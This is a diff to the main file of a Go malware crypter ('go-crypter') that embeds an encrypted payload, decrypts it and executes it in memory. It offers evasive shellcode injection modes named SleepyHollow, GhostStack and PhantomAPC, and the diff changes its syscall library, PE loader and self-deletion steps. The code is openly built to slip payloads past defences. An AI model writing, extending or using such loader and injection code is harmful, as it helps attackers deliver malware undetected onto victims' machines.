@@ -14,9 +14,10 @@ import (
 	"golang.org/x/crypto/argon2"
 	"golang.org/x/crypto/chacha20poly1305"
 	"golang.org/x/crypto/twofish"
-	"github.com/carved4/go-direct-syscall"
+	"github.com/carved4/go-native-syscall"
 	runpe "go-crypter/pkg/runpe"
 	runshellalt "go-crypter/pkg/runshellalt"
+	"runtime/debug"
 )
 //go:embed payload.cbor
 var payloadData []byte
@@ -131,13 +132,13 @@ func decryptFile() ([]byte, error) {
 }
 
 func main(){
+	debug.SetGCPercent(-1)
 	// Parse command line flags
 	sleepyHollowFlag := flag.Bool("sleepy", false, "Use SleepyHollow evasive shellcode execution method")
 	ghostFlag := flag.Bool("ghost", false, "Use GhostStack thread context manipulation execution method")
 	phantomFlag := flag.Bool("phantom", false, "Use PhantomAPC asynchronous procedure call injection method")
 	flag.Parse()
 
-	winapi.ApplyAllPatches()
 	decryptedBytes, err := decryptFile()
 	if err != nil {
 		fmt.Println("Error decrypting file:", err)
@@ -172,10 +173,8 @@ func main(){
 	// Execute based on payload type
 	switch strings.ToLower(payload.PayloadType) {
 	case "exe":
-		winapi.SelfDel()
-		runpe.ExecuteInMemory(decryptedBytes)
+		runpe.LoadPEFromBytes(decryptedBytes)
 	case "shellcode":
-		winapi.SelfDel()
 		if *sleepyHollowFlag {
 			err := runshellalt.SleepyHollow(decryptedBytes)
 			fmt.Println("SleepyHollow execution started")
